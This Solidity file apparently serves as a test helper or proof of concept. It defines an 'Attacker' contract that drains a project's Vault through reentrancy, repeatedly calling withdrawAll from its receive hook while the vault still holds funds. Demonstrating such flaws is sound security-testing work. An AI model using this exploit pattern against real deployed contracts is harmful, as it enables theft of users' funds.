// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Vault} from "../../src/Vault.sol";

/// Re-enters Vault.withdrawAll from its receive hook for as long as the vault can pay.
contract Attacker {
    Vault public immutable vault;

    constructor(Vault vault_) {
        vault = vault_;
    }

    function attack() external payable {
        vault.deposit{value: msg.value}();
        vault.withdrawAll();
    }

    receive() external payable {
        if (address(vault).balance >= msg.value) {
            vault.withdrawAll();
        }
    }
}
